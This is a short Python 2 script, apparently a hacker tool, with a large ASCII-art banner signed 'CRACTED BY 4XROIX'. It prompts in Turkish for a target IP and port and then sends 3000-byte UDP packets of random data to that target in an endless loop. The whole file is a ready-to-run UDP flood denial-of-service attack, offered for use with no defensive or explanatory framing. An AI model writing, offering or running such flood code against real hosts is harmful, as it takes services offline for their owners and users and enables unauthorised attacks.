import random
import os
import socket

print("""

  ``   ``  ``   ``  ``   ``  ``  `````............-------------...`  ``  ``   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ````..-....................-------::::////:-.`   ``  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``   `.-----........................------::::////+++/:.  ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``-::----...........`.``...........-----:::://///+++ooo-  ``   `   ``  ``   ``
   `   ``  ``   `   ``-:::-------.......`````````........------:::://+++++ooos:`   `   `   ``   `   
                     -::::::--..........````````............------::://++o+oos+                     
``   `   ``   `   `` :::::-.......`````..``````.............--/+oosssso+/+oooso ``   `   ``   `   ``
  ``   ``  ``   ``  `/:::/syhdddhys+:-.```..```.........-:oydhhdddhyyyyhhyoooos`  ``   ``  ``   ``  
``   ``  ``  ``   `` //+ys+///+osssso+::/-``.````.....:sdmmNmho/:---::://+ssoos```   ``  ``  ``   ``
  ``   ``  ``   ``  .///--....`````---sdmmy.```````./hmmmhs+:-.....---:://++oos.  ``   ``  ``   ``  
``   ``  ``  ``   ``-/:--....``   ``..-/shs-```````.ymho/:........`.--:://++oos-``   ``  ``  ``   ``
  ``   ``  ``   ``  :/:-....``````.........``    ``.-:::.........----::::/++oos:  ``   ``  ``   ``  
``   ``  ``  ``   ``//:-....................`    ``-:::.....--------:::://++oos:``   ``  ``  ``   ``
  ``   ``  ``   ``  //:--......````.........`    `.-::--.....`` ````.:::/++oooo/  ``   ``  ``   ``  
``   `   ``   `   ``+:::----`  ``   `` `..```    `.-:::-.```  ``   `` -//++++oo+``   `   ``   `   ``
                   `/:----..``      ```````.`   ``.-::::-...```````.-:::///++ooo                    
   `   `    `   `  `/:---...........``.``.```````..-:::::---..--------::://++oss   `   `    `   `   
``   `   ``   `   ``/:--..................`````...--::::::---...------:::///++oy``   `   ``  ``   ``
  ``   ``  ``   ``  :-..----....`````.....`````...--::::::---..------::://///+oy  ``   ``  ``   ``  
``   ``  ``  ``   ``:-------..``` `````...``````..--::::::-------.---:://///+os+``   ``  ``  ``   ``
  ``   ``  ``   ``  -:-::----.``      `..````````..-:::::::::-------::///+++osy.  ``   ``  ``   ``  
``   ``  ``  ``   ```+::::---...```....``````  ```.-::::::://::----:::///++osso ``   ``  ``  ``   ``
  ``   ``  ``   ``  `//::----.....--...`````    ```.-::::::://::::::://++oo+oy:`  ``   ``  ``   ``  
``   ``  ``  ``   `` -+---:/:----..........``   ``.-::://///:::::::://ydo/:+ss  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``+/..:mh-......``..--....``..-://////:::::::::::yNy+:/sy:``  ``   ``  ``   ``  
``   `   ``   `   ``  -/:..:my-...```````.`./yssosyhdo::-------::::+hmy+//oss`  ``   `   ``   `   ``
                      `+/-..:dmo-.``````../ohhhhsymmddyo:-----::/ohmdo++/osy-                       
   `   ``  ``   `   `` ://-..-ommhso++ooshhhyhs:--/dmmdddhyysyhdmmhs+++/oss+  ``   `   ``  ``   `   
``   `   ``   `   ``  ``:/::...-:oyyhdddddhhy+-...-:sdddddddhyso+//++//oss/```  ``   `   ``  ``   ``
  ``   ``  ``   ``  ``  `::::.`.--....--:ossssooooosssyss/::::::/+++//oso-`   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``  -:::-..-:-....````...........----::/++++/:+ss+`   ``  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``   ```:/::-.-------...........---::///+++++:/oso-  ``   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ```::::.-----....-/hhhdddd+::::///+++/+oo/  ``   ``  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``   ``  ```-::-----......hmNNNNy/::::://+/+oo+. ``  ``   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ``  ``.-::---..```.ommNmms:---::/+++oo- ``  ``   ``  ``   `   ``  ``   ``
  ``   ``  ``   ``  ``   `   ``   `.-:---..``.+mmmmms:---:/++oo/``   ``   `   ``  ``   ``  ``   ``  
                                    `.---...../mmmmms:--:/++o/.`                                    
``   `   ``   `   ``   `   `    `   ` `.:--...:NNNNNs/:::/++-  `   `    `   `   ``   `   ``   `   ``
  ``   ``  ``   ``  ``   `   ``   `   ```-:----dNNNNo/:/++- ``   `   ``   `   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ``  ``   ``  ```--::oNNNNs++/. ``  ``   ``  ``   ``  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``   ``  ``  ``   ``  ``  `.omh:`   ``  ``   ``  ``  ``   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ``  ``   ``  ``   ``  ``  ``   ``  ``   ``  ``   ``  ``   ``  ``  ``   ``
                                      .::CRACTED BY 4XROIX::.
""")
hedefip = raw_input("HEDEF IP >>>")
port = input("HEDEF PORT >>>")

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sayac = 0
bytes=random._urandom(3000)
while True:
    s.sendto(bytes,(hedefip,port))
    sayac += 1
    print(int(sayac))
    